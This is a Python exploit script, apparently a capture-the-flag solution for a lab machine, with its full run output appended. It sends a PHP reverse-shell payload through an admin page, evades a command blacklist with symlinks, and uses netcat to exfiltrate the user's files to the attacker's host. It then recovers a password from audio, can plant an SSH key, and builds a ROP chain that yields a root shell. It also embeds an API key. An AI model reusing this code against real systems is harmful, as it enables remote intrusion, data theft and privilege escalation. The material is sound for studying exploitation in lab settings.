#!/usr/bin/env python2
# Author: Alamot (Antonios Tsolis)

import time
import wave
import struct
import signal, thread
from pwn import *
import urllib2, urllib
from os.path import expanduser
import speech_recognition as sr
from base64 import b64encode, b64decode
signal.signal(signal.SIGINT, signal.SIG_DFL)

XALVAS_PASSWORD = ""
HOME = expanduser("~")
DEBUG = False
RHOST = "10.10.10.27"
RPORT = 80
RPATH = "/tmp/.alamot/"      # path writtable by www
RPATH2 =  RPATH[:-1]+"2/"    # path writtable by xalvas
LHOST = "10.10.15.128"
LPORT = 60000
LPORT2 = 60001

if DEBUG:
    context.log_level = 'debug'
else:
    context.log_level = 'info'

def conv(num):
    return struct.pack("<I",num)

PTYSHELL_PAYLOAD = "<?php system(\"python2 -c \\\"import os, pty, socket; lhost = '"+ str(LHOST) + "'; lport = " + str(LPORT) + "; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((lhost, lport)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); os.putenv('HISTFILE','/dev/null'); pty.spawn('/bin/bash'); s.close()\\\"\") ?>"

names2symbols = {"zero":"0", "one":"1", "two":"2", "three":"3", "four":"4", "five":"5", "six":"6", "seven":"7", "eight":"8", "nine":"9", "asterisk":"*", "dot":".", "tilde":"~", "percent":"%", "ambersand":"&", "caret":"^", "plus":"+", "equal":"=", "colon":":", "semicolon":";", "comma":","}


def merge_lists(a, b):
    c = []
    b_oldindex = 0
    for a_index in range(len(a)):
        match = False
        for b_index in range(b_oldindex, len(b)):
            if a[a_index] == b[b_index]:
                c.extend(b[b_oldindex:b_index+1])
                b_oldindex = b_index + 1
                match = True
                break
        if not match:
            c.append(a[a_index])
    if b_oldindex < len(b):
        c.extend(b[b_oldindex:])
    return c
    

def retrieve_password_from_audio():
    # We open the two audio files and subtract them. We write the result in
    # two files (one with slower rate for better speech recognition)
    log.info("Subtracting the two audio tracks...")
    wave1 = wave.open('recov.wav', 'r')
    wave2 = wave.open('rick.wav', 'r')
    diff = wave.open('diff.wav', 'w')
    diff_slower = wave.open('diff_slower.wav', 'w')
    
    diff.setnchannels(1)
    diff.setsampwidth(2)
    diff.setframerate(44100//1.35) 
    diff_slower.setnchannels(1)
    diff_slower.setsampwidth(2)
    diff_slower.setframerate(44100//1.2)
    
    frames = ""
    for i in range(wave1.getnframes()):
        f1 = wave1.readframes(1)
        f2 = wave2.readframes(1)
        c1 = struct.unpack('h', f1[:2])[0] - struct.unpack('h', f2[:2])[0]
        c2 = struct.unpack('h', f1[2:])[0] - struct.unpack('h', f2[2:])[0]
        c = (c1+c2)/2 # Convert to mono
        frames += struct.pack('<h', c)

    frames = frames[1375000:] + frames[:330000] # We unite the two ends
    diff.writeframes(frames)
    diff_slower.writeframes(frames)
    diff.close()
    diff_slower.close()
    wave1.close()
    wave2.close()
    
    # recognize speech using Wit.ai
    # Wit.ai keys are 32-character uppercase alphanumeric strings
    WIT_AI_KEY = "I2XP7SK2MAJTKIKQ3OH6HUYTD2L3BS22"
    r = sr.Recognizer()
    with sr.AudioFile("diff.wav") as df:
        audio = r.record(df)
    with sr.AudioFile("diff_slower.wav") as df_slower:
        audio_slower = r.record(df_slower)
    try:
        with log.progress("Sending audio to Wit.ai for speech recognition") as p1:
            result = r.recognize_wit(audio, key=WIT_AI_KEY)
            p1.success("I got Wit.ai response: \"" +result+"\"")
        with log.progress("Waiting 2 seconds before sending 2nd request") as p2:
            time.sleep(2)
            p2.success("OK")
        with log.progress("Sending slower audio to Wit.ai for speech recognition") as p3:
            result_slower = r.recognize_wit(audio_slower, key=WIT_AI_KEY)
            p3.success("Wit.ai thinks you said: \"" +result_slower+"\"")
    
        list1 = result.split(' ')
        list2 = result_slower.split(' ')
        combined = merge_lists(list1, list2)
        log.info("Combining the two results for better recognition: "+str(combined))
        password = ""
        for name in combined:
            if name in names2symbols:
                password += names2symbols[name]
            else:
                log.failure("Dismissing word '"+name+"' because it is not a key symbol.")
        password = password.strip()
        log.success("Retrieved password from audio: " + password)
        return password
    except sr.UnknownValueError:
        log.failure("Wit.ai could not understand audio")
    except sr.RequestError as e:
        log.failure("Could not request results from Wit.ai service; {0}".format(e))


# Function to send a pty Python shell via PHP using the GET RCE
def send_ptyshell_payload():
    try:
        log.info("Sending pty shell payload...")
        urlopener = urllib2.build_opener()
        urlopener.addheaders.append(('Cookie', 'adminpowa=noonecares'))
        urlenc_data = urllib.urlencode({"html":PTYSHELL_PAYLOAD})
        urlopener.open("http://"+str(RHOST)+":"+str(RPORT)+"/admin.php?"+urlenc_data)
    except urllib2.HTTPError as e:
        log.error(str(e.code)+": "+e.message)
    except urllib2.URLError as e:
        log.error(e.message)
        

if (raw_input("Should I try to retrieve xalvas' password from audio (y/n): ")[0].lower() == 'y'):
    try:
        threading.Thread(target=send_ptyshell_payload).start()
    except Exception as e:
        log.failure(str(e))
    ptyshell = listen(LPORT).wait_for_connection()
    ptyshell.sendline("mkdir -p "+RPATH)
    ptyshell.sendline("chmod +w "+RPATH)
    # Symlink trick to evade blacklist
    log.info("Symlinking python2 in " +RPATH+ "pyt2 to evade blacklisting...")
    ptyshell.sendline("ln -s /usr/bin/python2 "+RPATH+"pyt2")
    ptyshell.sendline("ln -s /bin/nc "+RPATH+"lnc")
    p=log.progress("Waiting 5 seconds for blacklisted session to terminate")
    time.sleep(5)
    p.success("OK")
    log.info("Altering payload to evade blacklisting...")
    # Alter payload to evade blacklist
    PTYSHELL_PAYLOAD = PTYSHELL_PAYLOAD.replace("python2", RPATH+"pyt2")
    try:
        threading.Thread(target=send_ptyshell_payload).start()
    except Exception as e:
        log.failure(str(e))
    ptyshell = listen(LPORT).wait_for_connection()
    if not os.path.isfile("./recov.wav"):
        log.info("Trying to download recov.wav...")
        ptyshell.sendline(RPATH+"lnc -w 7 " + str(LHOST) + " " + str(LPORT2) + " < /home/xalvas/recov.wav")
        data = listen(LPORT2).wait_for_connection().recvall()
        with open("recov.wav", "w") as f:
            f.write(data)
    if not os.path.isfile("./rick.wav"):            
        log.info("Trying to download rick.wav...")
        ptyshell.sendline(RPATH+"lnc -w 7 " + str(LHOST) + " " + str(LPORT2) + " < /home/xalvas/alarmclocks/rick.wav")
        data = listen(LPORT2).wait_for_connection().recvall()
        with open("rick.wav", "w") as f:
            f.write(data)
    XALVAS_PASSWORD = retrieve_password_from_audio()
else:
    XALVAS_PASSWORD = "18547936..*"

# I didn't remember that user Xalvas has already ssh access.
# So I wrote this to add my public key to authorized_keys.
if (raw_input("Do you want to add your public key to user Xalvas' authorized_keys? (y/n): ")[0].lower() == 'y'):
    with open(HOME+"/.ssh/id_rsa.pub", "rt") as f:
        rsa_pubkey = f.read()
    try:
        threading.Thread(target=send_ptyshell_payload).start()
    except Exception as e:
        log.error(e.message)
    ptyshell = listen(LPORT).wait_for_connection()
    ptyshell.sendline("su - xalvas")
    ptyshell.sendline(XALVAS_PASSWORD)
    ptyshell.sendline("mkdir ~/.ssh")
    ptyshell.sendline("printf '\n" + rsa_pubkey + "\n' >> ~/.ssh/authorized_keys")
    log.info("Public ssh key added successfully.")

################################ EXPLOITATION ##################################

xalvas_ssh = ssh(host=RHOST, port=22, user='xalvas', password=XALVAS_PASSWORD)
#xalvas_ssh.download_file("~/app/goodluck",local="./goodluck")
xalvas_ssh.run("mkdir -p "+RPATH2)
xalvas_ssh.run("chmod +w "+RPATH2)

############################# LEAK SECRET PAYLOAD ##############################

# Write leak secret payload
with open("leaksecret_payload", "wb") as f:
    f.write("\xff\xff\xff\xff\xff\xff\xff\xff\xf8\x2f\x00\x80\xff\xff")
# Upload leak secret payload
xalvas_ssh.upload_file("leaksecret_payload",RPATH2+".payload1")
goodluck = xalvas_ssh.run("~/app/goodluck")
# Send leak secret payload
goodluck.sendline(RPATH2+".payload1")
goodluck.sendline("2")
goodluck.recvuntil("debug info: 0x")
secret=goodluck.recvuntil("\n").strip().zfill(8)
log.info("Secret: "+secret)

############################# ADMIN LOGIN PAYLOAD ##############################

# Write admin login payload
lhex = [secret[i:i+2] for i in range(0, len(secret), 2)]
laddress = ['f4', '2f', '00', '80', 'ff','ff']
with open ('adminlogin_payload', 'wb') as f:
    for e in lhex[::-1]:
        f.write(chr(int(e, 16)))
    for e in lhex[::-1]:
        f.write(chr(int(e, 16)))
    for e in laddress :
        f.write(chr(int(e, 16)))
# Upload admin login payload
xalvas_ssh.upload_file("adminlogin_payload",RPATH2+".payload2")
goodluck.sendline("4")
goodluck.sendline(RPATH2+".payload2")
goodluck.sendline("3")
goodluck.recvuntil("vulnerable pointer is at ")
base=int(goodluck.recvuntil("\n").strip().zfill(8), 16)
log.info("Buffer base address: "+hex(base))

############################## ROOT SHELL PAYLOAD ##############################

# Write root shell payload 
fake_ebp1 = base+16
setuid_addr = 0xb7ecb2e0
leave_ret = 0x80000b2e
setuid_args = 0x00000000

fake_ebp2 = fake_ebp1+28
execve_addr = 0xb7eca7e0
leave_ret = 0x80000b2e
execve_arg1 = 0xb7f759ab
execve_arg1 = 0xb7f759ab
execve_arg2 = 0x00000000
execve_arg3 = 0x00000000

fake_ebp3 = fake_ebp2+16
exit_addr = 0xb7e489d0
leave_ret = 0x80000b2e
exir_args = 0x00000000

fake_ebp0 = base
leave_ret = 0x80000b2e 

buf = ""
buf += conv(fake_ebp1)
buf += conv(setuid_addr)
buf += conv(leave_ret)
buf += conv(setuid_args)
buf += conv(fake_ebp2)
buf += conv(execve_addr)
buf += conv(leave_ret)
buf += conv(execve_arg1)
buf += conv(execve_arg2)
buf += conv(execve_arg2)
buf += conv(execve_arg3)
buf += conv(fake_ebp3)
buf += conv(exit_addr)
buf += conv(leave_ret)
buf += conv(exir_args)
buf += conv(leave_ret)
#### 16*4 = 64
buf += "A"*8
buf += conv(fake_ebp0)
buf += conv(leave_ret) ### RETURN ADDRESS
buf += conv(setuid_addr)
buf += conv(leave_ret)
buf += conv(execve_addr)
buf += conv(leave_ret)
buf += conv(exit_addr)
buf += conv(leave_ret)

with open ('rootshell_payload', 'wb') as f:
    f.write(buf)

# Upload root shell payload
xalvas_ssh.upload_file("rootshell_payload",RPATH2+".payload3")
goodluck.sendline(RPATH2+".payload3")
goodluck.clean(0)
goodluck.interactive()

'''################################# OUTPUT ####################################

Should I try to retrieve xalvas' password from audio (y/n): y
[*] Sending pty shell payload...
[+] Trying to bind to 0.0.0.0 on port 60000: Done
[+] Waiting for connections on 0.0.0.0:60000: Got connection from 10.10.10.27 on port 50552
[*] Symlinking python2 in /tmp/.alamot/pyt2 to evade blacklisting...
[+] Waiting 5 seconds for blacklisted session to terminate: OK
[*] Altering payload to evade blacklisting...
[*] Sending pty shell payload...
[+] Trying to bind to 0.0.0.0 on port 60000: Done
[+] Waiting for connections on 0.0.0.0:60000: Got connection from 10.10.10.27 on port 50554
[*] Trying to download recov.wav...
[+] Trying to bind to 0.0.0.0 on port 60001: Done
[+] Waiting for connections on 0.0.0.0:60001: Got connection from 10.10.10.27 on port 40290
[+] Receiving all data: Done (3.05MB)
[*] Closed connection to 10.10.10.27 port 40290
[*] Trying to download rick.wav...
[+] Trying to bind to 0.0.0.0 on port 60001: Done
[+] Waiting for connections on 0.0.0.0:60001: Got connection from 10.10.10.27 on port 40292
[+] Receiving all data: Done (3.05MB)
[*] Closed connection to 10.10.10.27 port 40292
[*] Subtracting the two audio tracks...
[+] Sending audio to Wit.ai for speech recognition: I got Wit.ai response: "your password is one eight five four seven nine six dot dot asterisk"
[+] Waiting 2 seconds before sending 2nd request: OK
[+] Sending slower audio to Wit.ai for speech recognition: Wit.ai thinks you said: "password is one eight five four seven nine three six dot dot hester ask"
[*] Combining the two results for better recognition: [u'your', u'password', u'is', u'one', u'eight', u'five', u'four', u'seven', u'nine', u'three', u'six', u'dot', u'dot', u'asterisk', u'hester', u'ask']
[-] Dismissing word 'your' because it is not a key symbol.
[-] Dismissing word 'password' because it is not a key symbol.
[-] Dismissing word 'is' because it is not a key symbol.
[-] Dismissing word 'hester' because it is not a key symbol.
[-] Dismissing word 'ask' because it is not a key symbol.
[+] Retrieved password from audio: 18547936..*
Do you want to add your public key to user Xalvas' authorized_keys? (y/n): n
[+] Connecting to 10.10.10.27 on port 22: Done
[!] Couldn't check security settings on '10.10.10.27'
[+] Opening new channel: 'mkdir -p /tmp/.alamot2/': Done
[+] Opening new channel: 'chmod +w /tmp/.alamot2/': Done
[*] Uploading 'leaksecret_payload' to '/tmp/.alamot2/.payload1'
[+] Opening new channel: '~/app/goodluck': Done
[*] Secret: 0107592d
[*] Uploading 'adminlogin_payload' to '/tmp/.alamot2/.payload2'
[*] Buffer base address: 0xbffffbc0
[*] Uploading 'rootshell_payload' to '/tmp/.alamot2/.payload3'
[*] Switching to interactive mode
# $ whoami
root

'''################################ THE END ####################################
